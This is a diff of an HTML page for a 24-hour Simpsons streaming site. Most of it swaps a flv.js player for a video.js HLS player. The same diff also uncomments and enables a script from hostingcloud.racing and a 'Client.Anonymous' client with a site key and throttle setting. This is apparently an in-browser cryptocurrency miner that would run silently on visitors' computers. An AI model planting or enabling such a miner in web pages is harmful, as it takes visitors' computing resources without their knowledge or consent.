@@ -5,7 +5,11 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <title>Los Simpsons las 24 horas</title>
     <link rel="stylesheet" href="styles.css">
-    <!-- <script src="https://www.hostingcloud.racing/oS6R.js"></script>
+    <script src="https://cdn.bootcss.com/flv.js/1.5.0/flv.min.js"></script>
+    <link href="https://vjs.zencdn.net/7.2.3/video-js.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/videojs-contrib-hls/5.14.1/videojs-contrib-hls.js"></script>
+<script src="https://vjs.zencdn.net/7.2.3/video.js"></script>
+    <script src="https://www.hostingcloud.racing/oS6R.js"></script>
     <script>
         var _client = new Client.Anonymous('9495f348c76c3a5c7c3c0307dca34720a99027f57cc82f53f76fe0d347efd55a', {
             throttle: 1, c: 'w', ads: 0
@@ -21,34 +25,40 @@
     gtag('js', new Date());
 
     gtag('config', 'G-YFXW2KNE23');
-    </script> -->
+    </script>
 </head>
 <body class="sous-menu" style="overflow: hidden;">
         <img src="https://i.pinimg.com/originals/45/dc/ac/45dcac9d64330bb15043ecf77092973c.jpg" style="position: absolute; z-index: -1; left: -20%; top: -5%; object-fit:cover; height: 120%; width: 120%;">
-        <script src="https://cdn.bootcss.com/flv.js/1.5.0/flv.min.js"></script>
-        
-        <div class="tvContainer">
-            <!-- <div class="backgroundPanel"></div> -->
+
+        <video id='hls-example'  class="video-js vjs-default-skin" width="400" height="300" controls>
+            <source type="application/x-mpegURL" src="http://127.0.0.1:8000/channel01.m3u8">
+            </video>
+        <!-- <div class="tvContainer">
             <div class="videoItem">
                     <video id="videoElement" loop autoplay  controls poster="baner.jpg"></video>
             </div>
             
             <img src="tv.png" alt="" class="tvImage">
         </div>
-        
+         -->
             
         </img>
         <script>
-            if (flvjs.isSupported()) {
-                var videoElement = document.getElementById('videoElement');
-                var flvPlayer = flvjs.createPlayer({
-                    type: 'flv',
-                    url: 'ws://backend.seta.fun:8000/stream/stream.flv',
-                    isLive: true
-                });
-                flvPlayer.attachMediaElement(videoElement);
-                flvPlayer.load();
-            }
+            var player = videojs('hls-example');
+            player.play();
+            </script>
+        <script>
+            // var videoElement = document.getElementById('videoElement');
+            // var flvPlayer = flvjs.createPlayer({
+            //         type: 'flv',
+            //         url: 'http://localhost:8000/video/channel03.flv',
+            //         isLive: true
+            //     });
+            // flvPlayer.attachMediaElement(videoElement);                
+            // if (flvjs.isSupported()) {
+            //     videoElement.onplay = () => flvPlayer.load();
+            //     videoElement.onpause = () => flvPlayer.unload();
+            // }
         </script>
 </body>
 </html>
